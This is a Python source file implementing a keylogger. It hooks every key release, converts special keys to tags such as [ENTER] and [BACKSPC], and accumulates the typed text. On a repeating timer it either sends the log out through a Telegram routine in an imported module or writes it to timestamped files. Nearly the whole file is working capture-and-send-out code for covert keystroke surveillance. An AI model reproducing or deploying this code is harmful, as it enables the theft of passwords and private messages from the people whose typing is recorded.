import keyboard
import sys
from datetime import datetime
from threading import Timer
import method

class KeyboardHistory:
    def __init__(self, interval, method):
        self.log = ""
        self.interval = interval
        self.method = method
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if(len(name) > 1):
            if(name == "space"): name = " "
            elif(name == "enter"): name = "[ENTER]\n"
            elif(name == "decimal"): name = "."
            elif(name == "tab"): name = "[TAB]"
            elif(name == "alt"): name = "[ALT]"
            elif(name == "caps lock"): name = "[CAPSLK]"
            elif(name == "menu"): name = "[MENU]"
            elif(name == "shift"): name = "[SHIFT]"
            elif(name == "left windows"): name = "[WINDOWS]"
            elif(name == "ctrl"): name = "[CTRL]"
            elif(name == "home"): name = "[HOME]"
            elif(name == "end"): name = "[END]"
            elif(name == "page up"): name = "[PGUP]"
            elif(name == "page down"): name = "[PGDN]"
            elif(name == "esc"): name = "[ESC]"
            elif(name == "delete"): name = "[DELETE]"
            elif(name == "backspace"): name = "[BACKSPC]"
            elif(name == "print screen"): name = "[PRTSC]"
            elif(name == "up"): name = "[^]"
            elif(name == "down"): name = "[v]"
            elif(name == "left"): name = "[<]"
            elif(name == "right"): name = "[>]"
        self.log += name

    def log_report(self):
        if self.log:
            self.end_date = datetime.now()
            if self.method == "telegram":
                method.logTelegram(self.log)
            elif self.method == "file":
                start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
                end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
                self.filename = f"log_{start_dt_str}_{end_dt_str}"
                method.logFile(self.log, self.filename)
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.log_report)
        timer.daemon = True
        timer.start()

    def run(self):        
        try:
            self.start_dt = datetime.now()
            print("Running... (Press CTRL+C to stop)")
            keyboard.on_release(callback=self.callback)
            self.log_report()
            keyboard.wait()
        except KeyboardInterrupt:
            print("Stopped. Thanks:)")
            sys.exit(0)
